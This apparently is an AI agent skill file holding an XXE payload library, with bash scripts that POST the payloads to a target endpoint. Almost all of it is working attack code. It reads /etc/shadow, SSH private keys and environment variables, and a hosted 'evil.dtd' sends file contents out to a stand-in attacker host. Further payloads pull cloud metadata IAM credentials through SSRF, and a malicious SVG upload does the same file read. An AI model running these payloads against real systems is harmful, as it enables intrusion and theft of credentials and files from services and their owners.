---
name: payload-xxe
description: "XXE payload collection — classic file read, OOB via DNS/HTTP callback, blind XXE, SVG XXE, XInclude, SSRF via XXE, error-based XXE, parameter entity abuse. Triggers: 'xxe payload', 'xml external entity payload', 'xxe oob', 'blind xxe payload', 'svg xxe', 'xxe file read', 'xml injection payload', 'dtd payload', 'xinclude payload'."
---

# XXE Payloads

XML External Entity injection payload library.

## Phase 1: Classic File Read

```bash
TARGET="https://TARGET"
ENDPOINT="/api/parse"  # XML-consuming endpoint

# Basic file read payloads
FILE_READ_PAYLOADS=(
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><root>&xxe;</root>'
)

for payload in "${FILE_READ_PAYLOADS[@]}"; do
  result=$(curl -s -X POST "$TARGET$ENDPOINT" \
    -H "Content-Type: application/xml" \
    -d "$payload")
  echo "$result" | grep -qE "root:|www-data:|WINDOWS" && echo "XXE FILE READ: $payload" | head -1
done | tee /workspace/output/xxe-fileread.txt
```

## Phase 2: OOB (Out-of-Band) XXE

```bash
INTERACTSH="YOUR.oast.me"

# DNS OOB — detect blind XXE
OOB_DNS='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://'"$INTERACTSH"'/">]><root>&xxe;</root>'

# HTTP OOB — retrieve file via HTTP
OOB_HTTP='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://'"$INTERACTSH"'/xxe"> %xxe;]><root></root>'

# OOB data exfiltration via external DTD
# Host this on attacker.com as evil.dtd:
cat > /workspace/output/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://INTERACTSH/?data=%file;'>">
%eval;
%exfil;
EOF

# Payload that loads external DTD
OOB_EXFIL='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]><root></root>'

curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/xml" \
  -d "$OOB_DNS" >/dev/null
echo "Check $INTERACTSH for DNS callback" | tee /workspace/output/xxe-oob.txt

for payload in "$OOB_HTTP" "$OOB_EXFIL"; do
  echo "$payload" >> /workspace/output/xxe-oob.txt
done
```

## Phase 3: SSRF via XXE

```bash
# SSRF to cloud metadata
SSRF_PAYLOADS=(
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-api/v1/secret">]><root>&xxe;</root>'
)

for payload in "${SSRF_PAYLOADS[@]}"; do
  result=$(curl -s -X POST "$TARGET$ENDPOINT" \
    -H "Content-Type: application/xml" \
    -d "$payload")
  echo "SSRF response: $(echo $result | head -c 100)"
done | tee /workspace/output/xxe-ssrf.txt
```

## Phase 4: SVG & XInclude XXE

```bash
# SVG file upload XXE (if SVG upload allowed)
cat > /tmp/evil.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>
EOF

curl -s -X POST "$TARGET/upload" \
  -F "file=@/tmp/evil.svg;type=image/svg+xml" | tee /workspace/output/xxe-svg.txt

# XInclude (when full DOCTYPE not allowed but XML processed)
XINCLUDE_PAYLOADS=(
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/shadow" parse="text"/></foo>'
)

for payload in "${XINCLUDE_PAYLOADS[@]}"; do
  curl -s -X POST "$TARGET$ENDPOINT" \
    -H "Content-Type: application/xml" \
    -d "$payload"
done | tee /workspace/output/xxe-xinclude.txt
```

## Phase 5: Error-Based & Parameter Entity

```bash
# Error-based XXE (when output not reflected but errors are)
ERROR_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '"'"'
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM '"'"'file:///idontexist/%file;'"'"'>">
    &#x25;eval;
    &#x25;error;
  '"'"'>
  %local_dtd;
]><foo/>'

# Parameter entity chaining for blind read
BLIND_READ='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]><foo>&send;</foo>'

# evil.dtd content for error-based:
cat > /workspace/output/evil-error.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
EOF

echo "Error-based XXE payloads generated" | tee /workspace/output/xxe-error.txt
echo "$ERROR_PAYLOAD" >> /workspace/output/xxe-error.txt
```

## Output

Save to `/workspace/output/`:
- `xxe-fileread.txt` — confirmed file read
- `xxe-oob.txt` — OOB exfiltration payloads + evil.dtd
- `xxe-ssrf.txt` — SSRF via XXE
- `xxe-xinclude.txt` — XInclude results
- `xxe-error.txt` — error-based payloads

## Next Phase

→ `vuln-xxe` for full XXE exploitation methodology
→ `vuln-ssrf` if SSRF pivot needed from XXE
